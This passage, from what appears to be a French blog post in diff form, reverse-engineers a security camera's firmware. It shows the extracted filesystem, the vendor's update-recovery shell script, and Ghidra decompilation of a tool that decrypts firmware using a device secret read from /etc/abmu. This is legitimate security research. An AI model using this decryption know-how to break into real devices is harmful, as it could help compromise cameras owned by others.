+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── root
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── sbin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── sys
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── system
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── tmp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── usr
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   └── var
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── 3E0000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   └── squashfs-root
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── appver.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── autoboot.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── boot
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── localver.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── media
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── network
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── ntp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── part.env
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── vendor.env
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   └── vicam
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── 50000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   └── Linux-3.4.35.bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└── 710000
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> └── jffs2-root
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── abmu
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── audio
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── boardname
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── commit
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── config -&amp;gt; /system/etc/config
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── factinfo
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── factorymode
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── fstab
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── fw_env.config
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── hostapd.conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── hostname
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── init.d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── inittab
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── issue -&amp;gt; system/issue
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── issue.net -&amp;gt; issue
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── log
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── mdev
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── mdev.conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── passwd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── product_moduleid.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── profile
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── resolv6.conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── resolv.conf -&amp;gt; /tmp/resolv.conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── shadow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── snr.conf -&amp;gt; /etc/config/isp_bf314a.conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── system -&amp;gt; /system
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── udhcpd.conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── version
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ├── wlanname
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> └── wpa.conf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">37 directories, 33 files
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h2 id="quête-secondaire"
+>
+Quête secondaire
+&lt;/h2>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#quête-secondaire" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Quête secondaire" href="#qu%c3%aate-secondaire">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>En parcourant les différents fichiers obtenus, on peut voir que le script &lt;strong>/usr/local/tool/app_recovery.sh&lt;/strong> contient des fonctions faisant référence au téléchargement d&amp;rsquo;un paquet et à son déchiffrement :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CUR_DIR&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>dirname &lt;span class="nv">$0&lt;/span>&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nv">URL&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>cat /etc/conf/upgrade.url&lt;span class="sb">`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">DOWN_DIR&lt;/span>&lt;span class="o">=&lt;/span>/tmp/
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nv">AMBU_TOOL&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">CUR_DIR&lt;/span>&lt;span class="si">}&lt;/span>/ambulance
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">download_enc&lt;span class="o">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;download_enc...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">cd&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">DOWN_DIR&lt;/span>&lt;span class="si">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> i in &lt;span class="m">0&lt;/span> &lt;span class="m">1&lt;/span> &lt;span class="m">2&lt;/span> 3&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> sleep &lt;span class="m">15&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="si">${&lt;/span>&lt;span class="nv">AMBU_TOOL&lt;/span>&lt;span class="si">}&lt;/span> download &lt;span class="si">${&lt;/span>&lt;span class="nv">URL&lt;/span>&lt;span class="si">}&lt;/span> ./app.enc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$?&lt;/span> -eq &lt;span class="m">0&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;start install app...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> break&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">decrypt_enc&lt;span class="o">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">cd&lt;/span> &lt;span class="si">${&lt;/span>&lt;span class="nv">DOWN_DIR&lt;/span>&lt;span class="si">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="si">${&lt;/span>&lt;span class="nv">AMBU_TOOL&lt;/span>&lt;span class="si">}&lt;/span> unpack app.enc ./
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$?&lt;/span> -eq &lt;span class="m">0&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;decrypt_enc success...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> rm app.enc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f ./fwup_preinst.sh &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> chmod +x ./fwup_preinst.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ./fwup_preinst.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;decrypt_enc fail...&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span> x&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">URL&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> !&lt;span class="o">=&lt;/span> x&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> download_enc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> decrypt_enc
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>download_enc() :&lt;/strong> transmet le contenu du fichier &lt;em>/etc/conf/upgrade.url&lt;/em> qui contient l&amp;rsquo;URL du firmware chiffré en paramètre à l&amp;rsquo;outil &lt;strong>/usr/local/tool/ambulance&lt;/strong> afin qu&amp;rsquo;il le télécharge &lt;em>(paramètre download)&lt;/em>.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>decrypt_enc() :&lt;/strong> comme son nom l&amp;rsquo;indique, elle appelle principalement l&amp;rsquo;outil &lt;strong>/usr/local/tool/ambulance&lt;/strong> avec le paramètre &lt;em>unpack&lt;/em> suivi du firmware téléchargé et le dossier de destination afin &lt;em>d&amp;rsquo;unpacker&lt;/em> son contenu.&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>Ces hypothèses peuvent être confirmées en décompilant &lt;strong>/usr/local/tool/ambulance&lt;/strong> avec &lt;a
+class="gblog-markdown__link"
+href="https://ghidralite.com/"
+>Ghidra&lt;/a> et en analysant sa fonction principale &lt;em>FUN_00011f2c&lt;/em> :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">undefined4&lt;/span> &lt;span class="nf">FUN_00011f2c&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pcVar1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">iVar3&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">__stream&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined4&lt;/span> &lt;span class="n">uVar4&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">__s1&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined1&lt;/span> &lt;span class="n">local_6c&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">undefined1&lt;/span> &lt;span class="n">auStack_68&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">68&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pcVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">basename&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">getopt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;h&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">optind&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar2&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;usage: %s [OPTIONS] ACTION&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pcVar1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mh">0xffffffff&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">optind&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">param_1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">__s1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">param_2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">optind&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">__s1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;unpack&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar2&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">iVar3&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;usage: %s &amp;lt;input file&amp;gt; &amp;lt;output dir&amp;gt;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pcVar1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mh">0xffffffff&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;unpack %s...&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">local_6c&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">auStack_68&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x40&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">__stream&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/etc/abmu&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">__stream&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">fscanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">__stream&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_68&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;abmu:[%s]&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_68&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">FUN_00014868&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">auStack_68&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_6c&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">__stream&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="n">uVar4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">FUN_00014500&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;decrypt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_6c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">optind&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">optind&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;abmu(ret) = %d...&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">uVar4&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">uVar4&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;GetDeviceProductSecret failed...&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mh">0xffffffff&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iVar3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">__s1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;download&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar3&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;downlod begin&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="n">optind&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;usage: %s &amp;lt;download url&amp;gt; &amp;lt;output file&amp;gt;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pcVar1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mh">0xffffffff&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">uVar4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">FUN_000157fc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">optind&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">param_2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">optind&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">uVar4&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
